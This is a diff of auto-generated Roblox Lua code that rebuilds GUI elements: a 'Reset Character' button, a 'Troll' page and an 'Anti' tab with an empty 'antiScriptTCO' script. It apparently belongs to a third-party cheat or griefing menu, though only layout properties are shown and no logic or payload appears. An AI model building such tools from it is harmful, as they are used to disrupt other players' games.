 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.UIPadding
-G2L["16e"] = Instance.new("UIPadding", G2L["16d"]);
-G2L["16e"]["PaddingTop"] = UDim.new(0, 2);
-G2L["16e"]["PaddingRight"] = UDim.new(0, 3);
-G2L["16e"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["16e"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["19c"] = Instance.new("UIPadding", G2L["19b"]);
+G2L["19c"]["PaddingTop"] = UDim.new(0, 2);
+G2L["19c"]["PaddingRight"] = UDim.new(0, 3);
+G2L["19c"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["19c"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame
-G2L["16f"] = Instance.new("Frame", G2L["16d"]);
-G2L["16f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["16f"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["16f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["16f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["16f"]["Name"] = [[buttonFrame]];
+G2L["19d"] = Instance.new("Frame", G2L["19b"]);
+G2L["19d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["19d"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["19d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["19d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["19d"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.outlineStroke
-G2L["170"] = Instance.new("UIStroke", G2L["16f"]);
-G2L["170"]["Thickness"] = 2;
-G2L["170"]["Name"] = [[outlineStroke]];
+G2L["19e"] = Instance.new("UIStroke", G2L["19d"]);
+G2L["19e"]["Thickness"] = 2;
+G2L["19e"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.buttonFade
-G2L["171"] = Instance.new("CanvasGroup", G2L["16f"]);
-G2L["171"]["BorderSizePixel"] = 0;
-G2L["171"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["171"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["171"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["171"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["171"]["Name"] = [[buttonFade]];
+G2L["19f"] = Instance.new("CanvasGroup", G2L["19d"]);
+G2L["19f"]["BorderSizePixel"] = 0;
+G2L["19f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19f"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["19f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19f"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.buttonFade.UIGradient
-G2L["172"] = Instance.new("UIGradient", G2L["171"]);
-G2L["172"]["Rotation"] = 90;
-G2L["172"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["1a0"] = Instance.new("UIGradient", G2L["19f"]);
+G2L["1a0"]["Rotation"] = 90;
+G2L["1a0"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.text
-G2L["173"] = Instance.new("TextLabel", G2L["16d"]);
-G2L["173"]["ZIndex"] = 2;
-G2L["173"]["BorderSizePixel"] = 0;
-G2L["173"]["TextSize"] = 14;
-G2L["173"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["173"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["173"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["173"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["173"]["BackgroundTransparency"] = 1;
-G2L["173"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["173"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["173"]["Text"] = [[Reset Character]];
-G2L["173"]["Name"] = [[text]];
+G2L["1a1"] = Instance.new("TextLabel", G2L["19b"]);
+G2L["1a1"]["ZIndex"] = 2;
+G2L["1a1"]["BorderSizePixel"] = 0;
+G2L["1a1"]["TextSize"] = 14;
+G2L["1a1"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a1"]["BackgroundTransparency"] = 1;
+G2L["1a1"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a1"]["Text"] = [[Reset Character]];
+G2L["1a1"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.text.text
-G2L["174"] = Instance.new("UIStroke", G2L["173"]);
-G2L["174"]["Name"] = [[text]];
+G2L["1a2"] = Instance.new("UIStroke", G2L["1a1"]);
+G2L["1a2"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.fillbar
-G2L["175"] = Instance.new("Frame", G2L["16c"]);
-G2L["175"]["ZIndex"] = 90;
-G2L["175"]["BorderSizePixel"] = 0;
-G2L["175"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["175"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["175"]["Name"] = [[fillbar]];
-G2L["175"]["BackgroundTransparency"] = 0.95;
+G2L["1a3"] = Instance.new("Frame", G2L["19a"]);
+G2L["1a3"]["ZIndex"] = 90;
+G2L["1a3"]["BorderSizePixel"] = 0;
+G2L["1a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a3"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["1a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a3"]["Name"] = [[fillbar]];
+G2L["1a3"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll
-G2L["176"] = Instance.new("ScrollingFrame", G2L["34"]);
-G2L["176"]["Visible"] = false;
-G2L["176"]["Active"] = true;
-G2L["176"]["BorderSizePixel"] = 0;
-G2L["176"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
-G2L["176"]["Name"] = [[Troll]];
-G2L["176"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["176"]["Size"] = UDim2.new(0, 360, 0, 255);
-G2L["176"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["176"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
-G2L["176"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["176"]["ScrollBarThickness"] = 0;
-G2L["176"]["BackgroundTransparency"] = 1;
+G2L["1a4"] = Instance.new("ScrollingFrame", G2L["34"]);
+G2L["1a4"]["Visible"] = false;
+G2L["1a4"]["Active"] = true;
+G2L["1a4"]["BorderSizePixel"] = 0;
+G2L["1a4"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
+G2L["1a4"]["Name"] = [[Troll]];
+G2L["1a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a4"]["Size"] = UDim2.new(0, 360, 0, 255);
+G2L["1a4"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a4"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
+G2L["1a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a4"]["ScrollBarThickness"] = 0;
+G2L["1a4"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.rightside
-G2L["177"] = Instance.new("Frame", G2L["176"]);
-G2L["177"]["BorderSizePixel"] = 0;
-G2L["177"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["177"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["177"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
-G2L["177"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["177"]["Name"] = [[rightside]];
-G2L["177"]["BackgroundTransparency"] = 1;
+G2L["1a5"] = Instance.new("Frame", G2L["1a4"]);
+G2L["1a5"]["BorderSizePixel"] = 0;
+G2L["1a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a5"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["1a5"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
+G2L["1a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a5"]["Name"] = [[rightside]];
+G2L["1a5"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.rightside.UIListLayout
-G2L["178"] = Instance.new("UIListLayout", G2L["177"]);
-G2L["178"]["Padding"] = UDim.new(0, 5);
-G2L["178"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["1a6"] = Instance.new("UIListLayout", G2L["1a5"]);
+G2L["1a6"]["Padding"] = UDim.new(0, 5);
+G2L["1a6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.leftside
-G2L["179"] = Instance.new("Frame", G2L["176"]);
-G2L["179"]["BorderSizePixel"] = 0;
-G2L["179"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["179"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["179"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
-G2L["179"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["179"]["Name"] = [[leftside]];
-G2L["179"]["BackgroundTransparency"] = 1;
+G2L["1a7"] = Instance.new("Frame", G2L["1a4"]);
+G2L["1a7"]["BorderSizePixel"] = 0;
+G2L["1a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a7"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["1a7"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
+G2L["1a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a7"]["Name"] = [[leftside]];
+G2L["1a7"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.leftside.UIListLayout
-G2L["17a"] = Instance.new("UIListLayout", G2L["179"]);
-G2L["17a"]["Padding"] = UDim.new(0, 5);
-G2L["17a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["1a8"] = Instance.new("UIListLayout", G2L["1a7"]);
+G2L["1a8"]["Padding"] = UDim.new(0, 5);
+G2L["1a8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain
-G2L["17b"] = Instance.new("ScrollingFrame", G2L["34"]);
-G2L["17b"]["Active"] = true;
-G2L["17b"]["BorderSizePixel"] = 0;
-G2L["17b"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
-G2L["17b"]["Name"] = [[TCOMain]];
-G2L["17b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["17b"]["Size"] = UDim2.new(0, 360, 0, 255);
-G2L["17b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["17b"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
-G2L["17b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["17b"]["ScrollBarThickness"] = 0;
-G2L["17b"]["BackgroundTransparency"] = 1;
+G2L["1a9"] = Instance.new("ScrollingFrame", G2L["34"]);
+G2L["1a9"]["Visible"] = false;
+G2L["1a9"]["Active"] = true;
+G2L["1a9"]["BorderSizePixel"] = 0;
+G2L["1a9"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
+G2L["1a9"]["Name"] = [[TCOMain]];
+G2L["1a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a9"]["Size"] = UDim2.new(0, 360, 0, 255);
+G2L["1a9"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a9"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
+G2L["1a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a9"]["ScrollBarThickness"] = 0;
+G2L["1a9"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside
-G2L["17c"] = Instance.new("Frame", G2L["17b"]);
-G2L["17c"]["BorderSizePixel"] = 0;
-G2L["17c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["17c"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["17c"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
-G2L["17c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["17c"]["Name"] = [[rightside]];
-G2L["17c"]["BackgroundTransparency"] = 1;
+G2L["1aa"] = Instance.new("Frame", G2L["1a9"]);
+G2L["1aa"]["BorderSizePixel"] = 0;
+G2L["1aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1aa"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["1aa"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
+G2L["1aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1aa"]["Name"] = [[rightside]];
+G2L["1aa"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.UIListLayout
-G2L["17d"] = Instance.new("UIListLayout", G2L["17c"]);
-G2L["17d"]["Padding"] = UDim.new(0, 5);
-G2L["17d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["1ab"] = Instance.new("UIListLayout", G2L["1aa"]);
+G2L["1ab"]["Padding"] = UDim.new(0, 5);
+G2L["1ab"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab
-G2L["17e"] = Instance.new("Frame", G2L["17c"]);
-G2L["17e"]["BorderSizePixel"] = 0;
-G2L["17e"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
-G2L["17e"]["Size"] = UDim2.new(0, 176, 0, 160);
-G2L["17e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["17e"]["Name"] = [[antiTab]];
+G2L["1ac"] = Instance.new("Frame", G2L["1aa"]);
+G2L["1ac"]["BorderSizePixel"] = 0;
+G2L["1ac"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
+G2L["1ac"]["Size"] = UDim2.new(0, 176, 0, 160);
+G2L["1ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ac"]["Name"] = [[antiTab]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.antiScriptTCO
-G2L["17f"] = Instance.new("LocalScript", G2L["17e"]);
-G2L["17f"]["Name"] = [[antiScriptTCO]];
+G2L["1ad"] = Instance.new("LocalScript", G2L["1ac"]);
+G2L["1ad"]["Name"] = [[antiScriptTCO]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======
-G2L["180"] = Instance.new("Frame", G2L["17e"]);
-G2L["180"]["BorderSizePixel"] = 0;
-G2L["180"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["180"]["Size"] = UDim2.new(1, 0, 0, 4);
-G2L["180"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["180"]["Name"] = [[======ACCENT======]];
-G2L["180"]["BackgroundTransparency"] = 1;
+G2L["1ae"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1ae"]["BorderSizePixel"] = 0;
+G2L["1ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ae"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["1ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ae"]["Name"] = [[======ACCENT======]];
+G2L["1ae"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======.GuiColor
-G2L["181"] = Instance.new("Frame", G2L["180"]);
-G2L["181"]["BorderSizePixel"] = 0;
-G2L["181"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["181"]["Size"] = UDim2.new(1, -2, 0, 2);
-G2L["181"]["Position"] = UDim2.new(0, 1, 0, 1);
-G2L["181"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["181"]["Name"] = [[GuiColor]];
+G2L["1af"] = Instance.new("Frame", G2L["1ae"]);
+G2L["1af"]["BorderSizePixel"] = 0;
+G2L["1af"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["1af"]["Size"] = UDim2.new(1, -2, 0, 2);
+G2L["1af"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["1af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1af"]["Name"] = [[GuiColor]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======.GuiColor.UICorner
-G2L["182"] = Instance.new("UICorner", G2L["181"]);
+G2L["1b0"] = Instance.new("UICorner", G2L["1af"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.UIListLayout
-G2L["183"] = Instance.new("UIListLayout", G2L["17e"]);
-G2L["183"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
-G2L["183"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["1b1"] = Instance.new("UIListLayout", G2L["1ac"]);
+G2L["1b1"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
+G2L["1b1"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======
-G2L["184"] = Instance.new("Frame", G2L["17e"]);
-G2L["184"]["BorderSizePixel"] = 0;
-G2L["184"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["184"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["184"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["184"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["184"]["Name"] = [[======TITLE======]];
-G2L["184"]["BackgroundTransparency"] = 1;
+G2L["1b2"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1b2"]["BorderSizePixel"] = 0;
+G2L["1b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b2"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["1b2"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["1b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b2"]["Name"] = [[======TITLE======]];
+G2L["1b2"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text
-G2L["185"] = Instance.new("TextLabel", G2L["184"]);
-G2L["185"]["TextWrapped"] = true;
-G2L["185"]["BorderSizePixel"] = 0;
-G2L["185"]["TextSize"] = 14;
-G2L["185"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["185"]["TextTransparency"] = 0.3;
-G2L["185"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["185"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["185"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["185"]["BackgroundTransparency"] = 1;
-G2L["185"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["185"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["185"]["Text"] = [[Anti]];
-G2L["185"]["Name"] = [[text]];
-G2L["185"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
+G2L["1b3"] = Instance.new("TextLabel", G2L["1b2"]);
+G2L["1b3"]["TextWrapped"] = true;
+G2L["1b3"]["BorderSizePixel"] = 0;
+G2L["1b3"]["TextSize"] = 14;
+G2L["1b3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1b3"]["TextTransparency"] = 0.3;
+G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b3"]["BackgroundTransparency"] = 1;
+G2L["1b3"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["1b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b3"]["Text"] = [[Anti]];
+G2L["1b3"]["Name"] = [[text]];
+G2L["1b3"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text.text
-G2L["186"] = Instance.new("UIStroke", G2L["185"]);
-G2L["186"]["Name"] = [[text]];
+G2L["1b4"] = Instance.new("UIStroke", G2L["1b3"]);
+G2L["1b4"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text.UIPadding
-G2L["187"] = Instance.new("UIPadding", G2L["185"]);
-G2L["187"]["PaddingLeft"] = UDim.new(0, 1);
+G2L["1b5"] = Instance.new("UIPadding", G2L["1b3"]);
+G2L["1b5"]["PaddingLeft"] = UDim.new(0, 1);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.minimise
-G2L["188"] = Instance.new("TextButton", G2L["184"]);
-G2L["188"]["BorderSizePixel"] = 0;
-G2L["188"]["TextTransparency"] = 0.3;
-G2L["188"]["TextSize"] = 14;
-G2L["188"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["188"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["188"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["188"]["BackgroundTransparency"] = 1;
-G2L["188"]["Size"] = UDim2.new(0, 35, 1, 0);
-G2L["188"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["188"]["Text"] = [[-]];
-G2L["188"]["Name"] = [[minimise]];
-G2L["188"]["Position"] = UDim2.new(1, -30, 0, 0);
+G2L["1b6"] = Instance.new("TextButton", G2L["1b2"]);
+G2L["1b6"]["BorderSizePixel"] = 0;
+G2L["1b6"]["TextTransparency"] = 0.3;
+G2L["1b6"]["TextSize"] = 14;
+G2L["1b6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b6"]["BackgroundTransparency"] = 1;
+G2L["1b6"]["Size"] = UDim2.new(0, 35, 1, 0);
+G2L["1b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b6"]["Text"] = [[-]];
+G2L["1b6"]["Name"] = [[minimise]];
+G2L["1b6"]["Position"] = UDim2.new(1, -30, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.greystroke
-G2L["189"] = Instance.new("UIStroke", G2L["17e"]);
-G2L["189"]["ZIndex"] = 99;
-G2L["189"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["189"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["189"]["Name"] = [[greystroke]];
-G2L["189"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+G2L["1b7"] = Instance.new("UIStroke", G2L["1ac"]);
+G2L["1b7"]["ZIndex"] = 99;
+G2L["1b7"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["1b7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["1b7"]["Name"] = [[greystroke]];
+G2L["1b7"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan
-G2L["18a"] = Instance.new("Frame", G2L["17e"]);
-G2L["18a"]["BorderSizePixel"] = 0;
-G2L["18a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["18a"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["18a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["18a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["18a"]["Name"] = [[maptidenan]];
-G2L["18a"]["LayoutOrder"] = 2;
-G2L["18a"]["BackgroundTransparency"] = 1;
+G2L["1b8"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1b8"]["BorderSizePixel"] = 0;
+G2L["1b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b8"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["1b8"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["1b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b8"]["Name"] = [[maptidenan]];
+G2L["1b8"]["LayoutOrder"] = 2;
+G2L["1b8"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button
-G2L["18b"] = Instance.new("TextButton", G2L["18a"]);
-G2L["18b"]["BorderSizePixel"] = 0;
-G2L["18b"]["TextTransparency"] = 1;
-G2L["18b"]["TextSize"] = 14;
-G2L["18b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["18b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["18b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["18b"]["BackgroundTransparency"] = 1;
-G2L["18b"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["18b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["18b"]["Name"] = [[button]];
+G2L["1b9"] = Instance.new("TextButton", G2L["1b8"]);
+G2L["1b9"]["BorderSizePixel"] = 0;
+G2L["1b9"]["TextTransparency"] = 1;
+G2L["1b9"]["TextSize"] = 14;
+G2L["1b9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b9"]["BackgroundTransparency"] = 1;
+G2L["1b9"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["1b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b9"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.UIPadding
-G2L["18c"] = Instance.new("UIPadding", G2L["18b"]);
-G2L["18c"]["PaddingTop"] = UDim.new(0, 3);
-G2L["18c"]["PaddingRight"] = UDim.new(0, 3);
-G2L["18c"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["18c"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["1ba"] = Instance.new("UIPadding", G2L["1b9"]);
+G2L["1ba"]["PaddingTop"] = UDim.new(0, 3);
